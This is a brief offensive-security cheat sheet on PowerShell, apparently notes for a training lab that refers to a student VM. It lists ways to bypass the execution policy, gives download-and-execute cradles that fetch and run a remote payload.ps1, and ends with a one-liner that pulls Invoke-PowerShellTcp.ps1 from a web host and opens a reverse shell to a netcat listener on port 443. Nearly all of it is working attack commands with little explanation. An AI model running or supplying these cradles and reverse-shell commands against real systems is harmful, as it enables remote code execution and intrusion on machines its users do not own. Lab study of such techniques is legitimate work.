# PowerShell Basics

# Bypass the prevention of users accidently executing scripts

15 ways of bypassing this execution policy -> https://www.netspi.com/blog/entryid/238/15 

powershell -ExecutionPolicy bypass
powershell -c <cmd>
powershell -encodedcommand
$env:PSExecutionPolicyPreference="bypass"

# Download execute cradle 

Invoke-CradleCrafter:
https://github.com/danielbohannon/Invoke-CradleCrafter

iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')

PSv3 onwards:

iex (iwr 'http://webserver/payload.ps1')

# REVERSE SHELL
# REMEMBER TO TURN OFF THE FIREWALL IN THE STUDENT-VM or ADD AN EXCEPTION
# Host machine needs a server to host Invoke-PowerShellTcp.ps1 such as HFS.
# Remember to use netcat listening on port 443
powershell iex (iwr -UseBasicParsing http://172.16.100.75/Invoke-PowerShellTcp.ps1);power -Reverse -IPAddress 172.17.100.75 -Port 443
